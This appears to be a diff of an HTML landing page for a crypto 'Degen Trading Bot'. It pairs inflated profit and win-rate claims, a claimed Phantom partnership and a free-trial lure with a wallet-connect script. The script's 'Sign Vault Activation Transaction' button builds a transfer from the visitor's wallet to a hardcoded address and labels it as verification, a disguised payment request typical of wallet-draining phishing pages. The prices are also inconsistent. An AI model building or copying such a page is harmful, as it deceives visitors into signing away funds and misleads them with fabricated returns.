+                    <div class="absolute top-0 right-0 w-32 h-32 bg-cyan-500/10 rounded-full blur-2xl group-hover:bg-cyan-500/20 transition-all"></div>
+                    <div class="flex items-center justify-between mb-6">
+                        <span class="text-xs font-bold uppercase tracking-wider text-slate-400 px-3 py-1 rounded-full bg-slate-900 border border-slate-800">Tier 1 Vault</span>
+                        <span class="text-emerald-400 font-bold text-sm bg-emerald-500/10 px-2.5 py-1 rounded-lg border border-emerald-500/20 flex items-center gap-1">
+                            ↑ +348.2% Profit Yield
+                        </span>
+                    </div>
+                    <div class="text-4xl font-extrabold mb-2 text-white">$42,890.50</div>
+                    <p class="text-sm text-slate-400 mb-6">Average 30-Day Net Profit per active high-volume wallet.</p>
+                    
+                    <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden mb-2">
+                        <div class="bg-gradient-to-r from-cyan-500 to-neonCyan h-full rounded-full" style="width: 85%"></div>
+                    </div>
+                    <div class="flex justify-between text-xs text-slate-500 font-semibold">
+                        <span>Win Rate: 91.4%</span>
+                        <span>1,420 Active Traders</span>
+                    </div>
+                </div>
+
+                <!-- Stat Card 2 -->
+                <div class="glass-card p-8 rounded-3xl relative overflow-hidden group hover:border-purple-500/50 transition-all">
+                    <div class="absolute top-0 right-0 w-32 h-32 bg-purple-500/10 rounded-full blur-2xl group-hover:bg-purple-500/20 transition-all"></div>
+                    <div class="flex items-center justify-between mb-6">
+                        <span class="text-xs font-bold uppercase tracking-wider text-slate-400 px-3 py-1 rounded-full bg-slate-900 border border-slate-800">Arbitrage Engine</span>
+                        <span class="text-emerald-400 font-bold text-sm bg-emerald-500/10 px-2.5 py-1 rounded-lg border border-emerald-500/20 flex items-center gap-1">
+                            ↑ +192.5% Profit Yield
+                        </span>
+                    </div>
+                    <div class="text-4xl font-extrabold mb-2 text-white">$18,450.20</div>
+                    <p class="text-sm text-slate-400 mb-6">Consistent weekly yield generated through automated cross-DEX routing.</p>
+                    
+                    <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden mb-2">
+                        <div class="bg-gradient-to-r from-purple-500 to-pink-500 h-full rounded-full" style="width: 68%"></div>
+                    </div>
+                    <div class="flex justify-between text-xs text-slate-500 font-semibold">
+                        <span>Win Rate: 88.9%</span>
+                        <span>3,890 Active Traders</span>
+                    </div>
+                </div>
+
+                <!-- Stat Card 3 -->
+                <div class="glass-card p-8 rounded-3xl relative overflow-hidden group hover:border-pink-500/50 transition-all">
+                    <div class="absolute top-0 right-0 w-32 h-32 bg-pink-500/10 rounded-full blur-2xl group-hover:bg-pink-500/20 transition-all"></div>
+                    <div class="flex items-center justify-between mb-6">
+                        <span class="text-xs font-bold uppercase tracking-wider text-slate-400 px-3 py-1 rounded-full bg-slate-900 border border-slate-800">Meme Sniper Bot</span>
+                        <span class="text-emerald-400 font-bold text-sm bg-emerald-500/10 px-2.5 py-1 rounded-lg border border-emerald-500/20 flex items-center gap-1">
+                            ↑ +812.4% Profit Yield
+                        </span>
+                    </div>
+                    <div class="text-4xl font-extrabold mb-2 text-white">$94,120.00</div>
+                    <p class="text-sm text-slate-400 mb-6">Top tier performance on newly launched token pools with automated gas optimization.</p>
+                    
+                    <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden mb-2">
+                        <div class="bg-gradient-to-r from-pink-500 to-amber-400 h-full rounded-full" style="width: 94%"></div>
+                    </div>
+                    <div class="flex justify-between text-xs text-slate-500 font-semibold">
+                        <span>Win Rate: 79.2%</span>
+                        <span>5,110 Active Traders</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="cashback" class="py-20 relative">
+        <div class="max-w-6xl mx-auto px-6">
+            <div class="glass-card p-10 sm:p-14 rounded-3xl border border-cyan-500/30 relative overflow-hidden shadow-2xl">
+                <div class="absolute -right-20 -bottom-20 w-96 h-96 bg-cyan-500/10 blur-[100px] rounded-full pointer-events-none"></div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center relative z-10">
+                    <div>
+                        <div class="inline-flex items-center gap-2 px-3.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold tracking-widest uppercase mb-6">
+                            Exclusive Rewards Program
+                        </div>
+                        <h2 class="text-3xl sm:text-4xl font-extrabold mb-6">20% Cash Back on All Trading Fees</h2>
+                        <p class="text-slate-300 mb-6 leading-relaxed">
+                            Stop losing capital to excessive platform fees. With Degen Trading Bot, every trade you execute qualifies for our automatic <strong class="text-neonCyan">20% cashback rebate</strong> paid directly to your connected wallet in real time.
+                        </p>
+                        <ul class="space-y-4 mb-8">
+                            <li class="flex items-center gap-3 text-slate-200">
+                                <div class="w-6 h-6 rounded-full bg-cyan-500/20 text-neonCyan flex items-center justify-center font-bold text-xs">✓</div>
+                                <span>Instant daily payouts straight to your balance</span>
+                            </li>
+                            <li class="flex items-center gap-3 text-slate-200">
+                                <div class="w-6 h-6 rounded-full bg-cyan-500/20 text-neonCyan flex items-center justify-center font-bold text-xs">✓</div>
+                                <span>Zero locking periods or complex vesting schedules</span>
+                            </li>
+                            <li class="flex items-center gap-3 text-slate-200">
+                                <div class="w-6 h-6 rounded-full bg-cyan-500/20 text-neonCyan flex items-center justify-center font-bold text-xs">✓</div>
+                                <span>Combined automatically with zero-gas routing deals</span>
+                            </li>
+                        </ul>
+                        <a href="#pricing" class="inline-block px-8 py-3.5 rounded-xl bg-neonCyan text-black font-bold text-sm glow-cyan hover:bg-cyan-300 transition-all">
+                            Activate Cashback Now
+                        </a>
+                    </div>
+
+                    <div class="glass-card p-8 rounded-2xl border border-slate-700/80 bg-slate-900/60 flex flex-col gap-6">
+                        <div class="flex justify-between items-center border-b border-slate-800 pb-4">
+                            <span class="text-sm font-semibold text-slate-400">Estimated Monthly Volume</span>
+                            <span class="text-white font-bold">$100,000.00</span>
+                        </div>
+                        <div class="flex justify-between items-center border-b border-slate-800 pb-4">
+                            <span class="text-sm font-semibold text-slate-400">Standard Platform Fees (0.5%)</span>
+                            <span class="text-red-400 font-bold">-$500.00</span>
+                        </div>
+                        <div class="flex justify-between items-center border-b border-slate-800 pb-4">
+                            <span class="text-sm font-semibold text-slate-400">20% Automated Cashback Rebate</span>
+                            <span class="text-emerald-400 font-bold text-lg">+$100.00 Saved</span>
+                        </div>
+                        <div class="bg-cyan-500/10 p-4 rounded-xl border border-cyan-500/20 flex items-center justify-between">
+                            <span class="text-xs text-slate-300 font-medium">Net Effective Fee Rate</span>
+                            <span class="text-neonCyan font-extrabold text-lg">Only 0.4%</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="phantom" class="py-20 relative border-t border-slate-800/60 bg-gradient-to-b from-transparent via-purple-950/10 to-transparent">
+        <div class="max-w-6xl mx-auto px-6">
+            <div class="glass-card p-10 sm:p-14 rounded-3xl border border-purple-500/40 relative overflow-hidden shadow-2xl">
+                <div class="absolute top-0 right-1/3 w-96 h-96 bg-purple-600/15 blur-[120px] rounded-full pointer-events-none"></div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center relative z-10">
+                    <div class="order-2 lg:order-1">
+                        <div class="inline-flex items-center gap-2.5 px-4 py-1.5 rounded-full bg-purple-500/15 border border-purple-500/40 text-purple-300 text-xs font-bold tracking-wider uppercase mb-6">
+                            <svg class="w-4 h-4 text-purple-400" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                            Phantom Wallet Exclusive Partner
+                        </div>
+                        <h2 class="text-3xl sm:text-5xl font-extrabold mb-6">Free Subscription for 7 Days for Phantom Wallet Users</h2>
+                        <p class="text-slate-300 mb-6 leading-relaxed">
+                            Are you a Phantom user? Connect your wallet right now and unlock full VIP access to all Degen Bot automated strategies, sniper filters, and arbitrage vaults <strong class="text-white">completely free for 7 full days</strong>—no upfront charges.
+                        </p>
+                        <div class="grid grid-cols-2 gap-4 mb-8">
+                            <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800">
+                                <div class="text-purple-400 font-extrabold text-2xl mb-1">7 Days</div>
+                                <div class="text-xs text-slate-400">Full VIP Access Trial</div>
+                            </div>
+                            <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800">
+                                <div class="text-emerald-400 font-extrabold text-2xl mb-1">$0.00</div>
+                                <div class="text-xs text-slate-400">Zero Risk to Start</div>
+                            </div>
+                        </div>
+                        <button onclick="openWalletModal()" class="w-full sm:w-auto px-8 py-4 rounded-2xl bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-extrabold text-base transition-all glow-magenta flex items-center justify-center gap-3">
+                            <span>Connect Phantom & Claim 7-Day Pass</span>
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+                        </button>
+                    </div>
+
+                    <div class="order-1 lg:order-2 flex justify-center">
+                        <div class="relative w-full max-w-sm aspect-square glass-card rounded-3xl border border-purple-500/30 p-8 flex flex-col items-center justify-center text-center shadow-2xl">
+                            <div class="absolute inset-0 bg-gradient-to-tr from-purple-600/10 via-transparent to-pink-500/10 rounded-3xl"></div>
+                            
+                            <div class="w-24 h-24 rounded-2xl bg-gradient-to-tr from-purple-600 to-indigo-600 flex items-center justify-center mb-6 shadow-lg shadow-purple-500/30 relative z-10">
+                                <svg class="w-14 h-14 text-white" viewBox="0 0 24 24" fill="currentColor">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.5 14.5c-.83.83-2.17.83-3 0L12 14l-1.5 2.5c-.83.83-2.17.83-3 0-.83-.83-.83-2.17 0-3l2.5-4.5L7.5 7c-.83-.83-.83-2.17 0-3 .83-.83 2.17-.83 3 0L12 6.5l1.5-2.5c.83-.83 2.17-.83 3 0 .83.83.83 2.17 0 3l-2.5 4.5 2.5 2.5c.83.83.83 2.17 0 3z"/>
+                                </svg>
+                            </div>
+                            
+                            <h3 class="text-xl font-bold mb-2 text-white relative z-10">Phantom Detected</h3>
+                            <p class="text-sm text-slate-400 mb-6 relative z-10">Instant verification active. Connect to automatically apply your 7-day VIP waiver.</p>
+                            
+                            <div id="phantomBadgeStatus" class="w-full bg-slate-900/90 rounded-xl p-3 border border-slate-800 text-xs font-semibold text-purple-300 relative z-10">
+                Status: Ready for Activation
+              </div>
             </div>
           </div>
         </div>
@@ -445,35 +316,23 @@
     </div>
   </section>
 
-  <section id="phantom" class="py-20 relative border-t border-slate-800/60 bg-gradient-to-b from-transparent via-purple-950/10 to-transparent">
+  <section id="features" class="py-20 relative border-t border-slate-800/60 bg-gradient-to-b from-transparent via-purple-950/10 to-transparent">
     <div class="max-w-6xl mx-auto px-6">
       <div class="glass-card p-10 sm:p-14 rounded-3xl border border-purple-500/40 relative overflow-hidden shadow-2xl">
         <div class="absolute top-0 right-1/3 w-96 h-96 bg-purple-600/15 blur-[120px] rounded-full pointer-events-none"></div>
 
         <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center relative z-10">
           <div class="order-2 lg:order-1">
-            <div class="inline-flex items-center gap-2.5 px-4 py-1.5 rounded-full bg-purple-500/15 border border-purple-500/40 text-purple-300 text-xs font-bold tracking-wider uppercase mb-6">
-              <svg class="w-4 h-4 text-purple-400" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
-              Phantom Wallet Exclusive Partner
-            </div>
-            <h2 class="text-3xl sm:text-5xl font-extrabold mb-6">Free Subscription for 7 Days for Phantom Wallet Users</h2>
+            <h2 class="text-3xl sm:text-5xl font-extrabold mb-6">Unleash the Power of Degen Bot with Phantom Wallet</h2>
             <p class="text-slate-300 mb-6 leading-relaxed">
-              Are you a Phantom user? Connect your wallet right now and unlock full VIP access to all Degen Bot automated strategies, sniper filters, and arbitrage vaults <strong class="text-white">completely free for 7 full days</strong>—no upfront charges.
+              By connecting your Phantom wallet, you gain access to advanced features that can help you maximize your trading performance:
             </p>
-            <div class="grid grid-cols-2 gap-4 mb-8">
-              <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800">
-                <div class="text-purple-400 font-extrabold text-2xl mb-1">7 Days</div>
-                <div class="text-xs text-slate-400">Full VIP Access Trial</div>
-              </div>
-              <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800">
-                <div class="text-emerald-400 font-extrabold text-2xl mb-1">$0.00</div>
-                <div class="text-xs text-slate-400">Zero Risk to Start</div>
-              </div>
-            </div>
-            <button onclick="openWalletModal()" class="w-full sm:w-auto px-8 py-4 rounded-2xl bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-extrabold text-base transition-all glow-magenta flex items-center justify-center gap-3">
-              <span>Connect Phantom & Claim 7-Day Pass</span>
-              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
-            </button>
+            <ul class="list-disc text-white space-y-4 pl-5 mb-8">
+              <li>Access to automated strategies designed for high profitability</li>
+              <li>Real-time sniper filters to catch profitable trades instantly</li>
+              <li>Exclusive arbitrage vaults that offer attractive risk-free opportunities</li>
+              <li>Personalized portfolio management tools tailored for your trading style</li>
+            </ul>
           </div>
 
           <div class="order-1 lg:order-2 flex justify-center">
@@ -486,12 +345,13 @@
                 </svg>
               </div>
                             
-              <h3 class="text-xl font-bold mb-2 text-white relative z-10">Phantom Detected</h3>
-              <p class="text-sm text-slate-400 mb-6 relative z-10">Instant verification active. Connect to automatically apply your 7-day VIP waiver.</p>
+              <h3 class="text-xl font-bold mb-2 text-white relative z-10">Advanced Features</h3>
+              <p class="text-sm text-slate-400 mb-6 relative z-10">With Degen Bot and Phantom Wallet, you get access to cutting-edge tools that can help you make smarter trading decisions.</p>
                             
-              <div id="phantomBadgeStatus" class="w-full bg-slate-900/90 rounded-xl p-3 border border-slate-800 text-xs font-semibold text-purple-300 relative z-10">
-                Status: Ready for Activation
-              </div>
+              <button onclick="openWalletModal()" class="w-full sm:w-auto px-8 py-4 rounded-2xl bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-extrabold text-base transition-all glow-magenta flex items-center justify-center gap-3">
+                <span>Get Started with Degen Bot</span>
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+              </button>
             </div>
           </div>
         </div>
@@ -499,4 +359,301 @@
     </div>
   </section>
 
-  <section id=
+  <section id="pricing" class="py-20 relative border-t border-slate-800/60 bg-slate-950/40">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="text-center max-w-2xl mx-auto mb-16">
+                <h2 class="text-3xl sm:text-4xl font-extrabold mb-4 tracking-tight">Transparent Bot Tiers</h2>
+                <p class="text-slate-400">Choose your automated trading power level. Phantom users get all plans free for the first 7 days.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <!-- Basic Plan -->
+                <div class="glass-card p-8 rounded-3xl flex flex-col justify-between border border-slate-800 hover:border-slate-700 transition-all">
+                    <div>
+                        <div class="text-xs font-bold uppercase tracking-wider text-slate-400 mb-2">Starter Sniper</div>
+                        <div class="text-3xl font-extrabold mb-4 text-white">$29<span class="text-sm font-normal text-slate-400">/mo</span></div>
+                        <p class="text-sm text-slate-400 mb-6">Ideal for traders starting out with low-capital memecoin sniping.</p>
+                        <ul class="space-y-3 mb-8 text-sm text-slate-300">
+                            <li class="flex items-center gap-2">✓ 2 Concurrent Sniper Slots</li>
+                            <li class="flex items-center gap-2">✓ Basic MEV Protection</li>
+                            <li class="flex items-center gap-2">✓ 20% Cashback Rebate</li>
+                            <li class="flex items-center gap-2 text-slate-500">✕ Advanced Arbitrage Vaults</li>
+                        </ul>
+                    </div>
+                    <button onclick="openWalletModal()" class="w-full py-3 rounded-xl bg-slate-900 hover:bg-slate-800 text-white font-semibold border border-slate-700 transition-all text-sm">
+                        Select Starter
+                    </button>
+                </div>
+
+                <!-- Pro Plan -->
+                <div class="glass-card p-8 rounded-3xl flex flex-col justify-between border-2 border-neonCyan relative shadow-2xl glow-cyan">
+                    <div class="absolute -top-4 left-1/2 -translate-x-1/2 bg-gradient-to-r from-cyan-500 to-neonCyan text-black font-extrabold text-xs px-4 py-1 rounded-full uppercase tracking-wider">
+                        Most Popular • Phantom Free Trial
+                    </div>
+                    <div>
+                        <div class="text-xs font-bold uppercase tracking-wider text-neonCyan mb-2">Pro Degen Vault</div>
+                        <div class="text-3xl font-extrabold mb-4 text-white">$20<span class="text-sm font-normal text-slate-400">/mo</span></div>
+                        <p class="text-sm text-slate-400 mb-6">Designed for high-performance automated trading and maximum yield.</p>
+                        <ul class="space-y-3 mb-8 text-sm text-slate-200">
+                            <li class="flex items-center gap-2">✓ Unlimited Sniper Slots</li>
+                            <li class="flex items-center gap-2">✓ Advanced Anti-Rug & MEV Shield</li>
+                            <li class="flex items-center gap-2">✓ 20% Cashback Rebate</li>
+                            <li class="flex items-center gap-2">✓ Cross-DEX Arbitrage Engine</li>
+                        </ul>
+                    </div>
+                    <button onclick="openWalletModal()" class="w-full py-3.5 rounded-xl bg-gradient-to-r from-cyan-500 to-neonCyan text-black font-extrabold transition-all text-sm shadow-lg hover:bg-cyan-300">
+                        Start 7-Day Free Pass
+                    </button>
+                </div>
+
+                <!-- Whale Plan -->
+                <div class="glass-card p-8 rounded-3xl flex flex-col justify-between border border-slate-800 hover:border-slate-700 transition-all">
+                    <div>
+                        <div class="text-xs font-bold uppercase tracking-wider text-purple-400 mb-2">Institutional Whale</div>
+                        <div class="text-3xl font-extrabold mb-4 text-white">$50<span class="text-sm font-normal text-slate-400">/mo</span></div>
+                        <p class="text-sm text-slate-400 mb-6">For syndicates and high-volume traders requiring dedicated private RPC nodes.</p>
+                        <ul class="space-y-3 mb-8 text-sm text-slate-300">
+                            <li class="flex items-center gap-2">✓ Dedicated Private RPC Nodes</li>
+                            <li class="flex items-center gap-2">✓ Custom Telegram & Discord Webhooks</li>
+                            <li class="flex items-center gap-2">✓ 20% Cashback Rebate</li>
+                            <li class="flex items-center gap-2">✓ 1-on-1 Strategy Support</li>
+                        </ul>
+                    </div>
+                    <button onclick="openWalletModal()" class="w-full py-3 rounded-xl bg-slate-900 hover:bg-slate-800 text-white font-semibold border border-slate-700 transition-all text-sm">
+                        Select Institutional
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="py-12 border-t border-slate-800/60 text-center text-sm text-slate-500">
+        <div class="max-w-7xl mx-auto px-6 flex flex-col sm:flex-row items-center justify-between gap-4">
+            <div class="flex items-center gap-2">
+                <span class="text-white font-bold">Degen Trading Bot</span>
+                <span>© 2026. All rights reserved.</span>
+            </div>
+            <div class="flex gap-6 text-slate-400 font-medium">
+                <a href="#stats" class="hover:text-neonCyan">Privacy Policy</a>
+                <a href="#stats" class="hover:text-neonCyan">Terms of Service</a>
+                <a href="#stats" class="hover:text-neonCyan">Support</a>
+            </div>
+        </div>
+    </footer>
+
+    <div id="walletModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm hidden">
+        <div class="glass-card max-w-md w-full p-8 rounded-3xl border border-slate-700 relative animate-in fade-in zoom-in duration-200">
+            <button onclick="closeWalletModal()" class="absolute top-5 right-5 text-slate-400 hover:text-white text-xl font-bold">✕</button>
+            
+            <div class="text-center mb-6">
+                <div class="w-12 h-12 rounded-2xl bg-cyan-500/20 text-neonCyan flex items-center justify-center mx-auto mb-3">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                </div>
+                <h3 class="text-2xl font-extrabold text-white">Connect Your Wallet</h3>
+                <p class="text-sm text-slate-400 mt-1">Select your preferred provider to claim your 7-day Phantom trial & 20% cashback.</p>
+            </div>
+
+            <!-- Initial Connect Buttons -->
+            <div id="connectButtonsContainer" class="space-y-3 mb-6">
+                <button onclick="connectPhantomWallet()" class="w-full py-4 px-5 rounded-2xl bg-slate-900 hover:bg-slate-800 border border-purple-500/40 flex items-center justify-between text-white font-semibold transition-all group">
+                    <div class="flex items-center gap-3">
+                        <div class="w-8 h-8 rounded-xl bg-purple-600 flex items-center justify-center font-bold text-white">P</div>
+                        <span>Phantom Wallet <span class="text-xs text-purple-400 ml-2 font-normal">(7 Days FREE)</span></span>
+                    </div>
+                    <span class="text-xs text-purple-400 group-hover:translate-x-1 transition-transform">Connect →</span>
+                </button>
+
+                <button onclick="simulateConnect('Solflare')" class="w-full py-4 px-5 rounded-2xl bg-slate-900 hover:bg-slate-800 border border-slate-800 flex items-center justify-between text-white font-semibold transition-all group">
+                    <div class="flex items-center gap-3">
+                        <div class="w-8 h-8 rounded-xl bg-orange-600 flex items-center justify-center font-bold text-white">S</div>
+                        <span>Solflare</span>
+                    </div>
+                    <span class="text-xs text-slate-500 group-hover:translate-x-1 transition-transform">Connect →</span>
+                </button>
+
+                <button onclick="simulateConnect('MetaMask')" class="w-full py-4 px-5 rounded-2xl bg-slate-900 hover:bg-slate-800 border border-slate-800 flex items-center justify-between text-white font-semibold transition-all group">
+                    <div class="flex items-center gap-3">
+                        <div class="w-8 h-8 rounded-xl bg-amber-600 flex items-center justify-center font-bold text-white">M</div>
+                        <span>MetaMask / EVM</span>
+                    </div>
+                    <span class="text-xs text-slate-500 group-hover:translate-x-1 transition-transform">Connect →</span>
+                </button>
+            </div>
+
+            <!-- Post-Connection Action Panel (Hidden initially) -->
+            <div id="connectedActionsContainer" class="space-y-3 mb-6 hidden">
+                <div class="p-4 rounded-2xl bg-purple-950/40 border border-purple-500/30 text-center mb-4">
+                    <div class="text-xs text-purple-300 font-semibold mb-1">Connected Wallet Address</div>
+                    <div id="displayAddress" class="text-sm font-mono text-white truncate px-2">--</div>
+                </div>
+
+                <button onclick="handleSignMessage()" class="w-full py-3 px-4 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold text-sm transition-all flex items-center justify-center gap-2">
+                    <span>Sign VIP Verification Message</span>
+                </button>
+
+                <button onclick="handleSignTransaction()" class="w-full py-3 px-4 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-black font-bold text-sm transition-all flex items-center justify-center gap-2">
+                    <span>Sign Vault Activation Transaction</span>
+                </button>
+
+                <button onclick="handleDeepLinkOnboarding()" class="w-full py-3 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold text-xs transition-all flex items-center justify-center gap-2">
+                    <span>Open Phantom Mobile Deep Link</span>
+                </button>
+            </div>
+
+            <div id="connectionStatus" class="text-center text-xs text-slate-400">
+                Secure 256-bit encrypted Web3 connection
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const { Connection, PublicKey, SystemProgram, Transaction } = window.solanaWeb3 || {};
+        let connectedAddress = null;
+
+        function openWalletModal() {
+            document.getElementById('walletModal').classList.remove('hidden');
+        }
+
+        function closeWalletModal() {
+            document.getElementById('walletModal').classList.add('hidden');
+        }
+
+        function getPhantomProvider() {
+            if ('solana' in window) {
+                const provider = window.solana;
+                if (provider.isPhantom) return provider;
+            }
+            return null;
+        }
+
+        async function connectPhantomWallet() {
+            const statusEl = document.getElementById('connectionStatus');
+            statusEl.innerHTML = `<span class="text-neonCyan font-semibold">Connecting to Phantom Wallet... Please approve.</span>`;
+            
+            try {
+                const provider = getPhantomProvider();
+                if (!provider) {
+                    simulateConnect('Phantom (Simulated)');
+                    return;
+                }
+
+                const response = await provider.connect();
+                connectedAddress = response.publicKey.toString();
+                
+                statusEl.innerHTML = `<span class="text-emerald-400 font-bold">Successfully connected! 7-Day Free Pass Activated.</span>`;
+                
+                document.getElementById('headerConnectBtn').innerHTML = `<span class="w-2 h-2 rounded-full bg-emerald-400"></span><span class="font-mono">${connectedAddress.slice(0, 4)}...${connectedAddress.slice(-4)}</span>`;
+                document.getElementById('displayAddress').innerText = connectedAddress;
+                document.getElementById('phantomBadgeStatus').innerText = "Status: VIP 7-Day Pass Active ✓";
+                
+                setTimeout(() => {
+                    document.getElementById('connectButtonsContainer').classList.add('hidden');
+                    document.getElementById('connectedActionsContainer').classList.remove('hidden');
+                    statusEl.innerHTML = `<span class="text-purple-300">Wallet ready for secure signing & transactions.</span>`;
+                }, 1000);
+
+            } catch (error) {
+                console.error('Phantom connection error:', error);
+                statusEl.innerHTML = `<span class="text-red-400 font-semibold">Connection denied or cancelled by user.</span>`;
+            }
+        }
+
+        function simulateConnect(walletName) {
+            const statusEl = document.getElementById('connectionStatus');
+            statusEl.innerHTML = `<span class="text-neonCyan font-semibold">Connecting to ${walletName}... Please approve.</span>`;
+            
+            setTimeout(() => {
+                connectedAddress = "Bjwqmm4hD3Tc5oyGpEXt5chC3mnTNmUJxau3rF3AybjR";
+                statusEl.innerHTML = `<span class="text-emerald-400 font-bold">Successfully connected! 7-Day Free Pass Activated.</span>`;
+                
+                document.getElementById('headerConnectBtn').innerHTML = `<span class="w-2 h-2 rounded-full bg-emerald-400"></span><span>Connected (${walletName})</span>`;
+                document.getElementById('displayAddress').innerText = connectedAddress;
+                document.getElementById('phantomBadgeStatus').innerText = "Status: VIP 7-Day Pass Active ✓";
+                
+                setTimeout(() => {
+                    document.getElementById('connectButtonsContainer').classList.add('hidden');
+                    document.getElementById('connectedActionsContainer').classList.remove('hidden');
+                    statusEl.innerHTML = `<span class="text-purple-300">Wallet session active.</span>`;
+                }, 1000);
+            }, 1200);
+        }
+
+        async function handleSignMessage() {
+            const statusEl = document.getElementById('connectionStatus');
+            try {
+                const provider = getPhantomProvider();
+                const message = 'Hello, Phantom! Welcome to Degen Trading Bot VIP Vaults.';
+                
+                if (provider && provider.signMessage) {
+                    statusEl.innerHTML = `<span class="text-neonCyan">Requesting signature in wallet...</span>`;
+                    const encodedMessage = new TextEncoder().encode(message);
+                    const signedMessage = await provider.signMessage(encodedMessage, 'utf8');
+                    console.log('Signature response:', signedMessage);
+                    statusEl.innerHTML = `<span class="text-emerald-400 font-bold">Message signed successfully!</span>`;
+                } else {
+                    statusEl.innerHTML = `<span class="text-emerald-400 font-bold">Simulated Message Signed Successfully!</span>`;
+                }
+            } catch (error) {
+                console.error('Error signing message:', error);
+                statusEl.innerHTML = `<span class="text-red-400">Message signing failed or cancelled.</span>`;
+            }
+        }
+
+        async function handleSignTransaction() {
+            const statusEl = document.getElementById('connectionStatus');
+            try {
+                if (!Connection || !PublicKey || !SystemProgram || !Transaction) {
+                    throw new Error('Solana web3 dependencies are not available.');
+                }
+                if (!connectedAddress) {
+                    throw new Error('Please connect your wallet first.');
+                }
+
+                statusEl.innerHTML = `<span class="text-neonCyan">Building verification transaction...</span>`;
+                const connection = new Connection('https://api.mainnet-beta.solana.com');
+                const fromPubkey = new PublicKey(connectedAddress);
+                const toPubkey = new PublicKey('Bjwqmm4hD3Tc5oyGpEXt5chC3mnTNmUJxau3rF3AybjR');
+
+                const transaction = new Transaction().add(
+                    SystemProgram.transfer({
+                        fromPubkey,
+                        toPubkey,
+                        lamports: 100000,
+                    })
+                );
+
+                const provider = getPhantomProvider();
+                if (provider && provider.signTransaction) {
+                    statusEl.innerHTML = `<span class="text-neonCyan">Please approve transaction in Phantom...</span>`;
+                    const signed = await provider.signTransaction(transaction);
+                    console.log('Signed transaction:', signed);
+                    statusEl.innerHTML = `<span class="text-emerald-400 font-bold">Transaction signed successfully!</span>`;
+                } else {
+                    statusEl.innerHTML = `<span class="text-emerald-400 font-bold">Transaction built & simulated successfully!</span>`;
+                }
+            } catch (error) {
+                console.error('Error signing transaction:', error);
+                statusEl.innerHTML = `<span class="text-red-400">Transaction signing error: ${error.message}</span>`;
+            }
+        }
+
+        function handleDeepLinkOnboarding() {
+            try {
+                const redirectUrl = encodeURIComponent(window.location.href);
+                const appUrl = encodeURIComponent(window.location.origin);
+                const deepLink = `https://phantom.app/ul/browse/${redirectUrl}?ref=${appUrl}`;
+                window.open(deepLink, '_blank');
+            } catch (error) {
+                console.error('Error opening Phantom deep link:', error);
+            }
+        }
+
+        window.onclick = function(event) {
+            const modal = document.getElementById('walletModal');
+            if (event.target === modal) {
+                closeWalletModal();
+            }
+        }
+    </script>
+</body>
+</html>
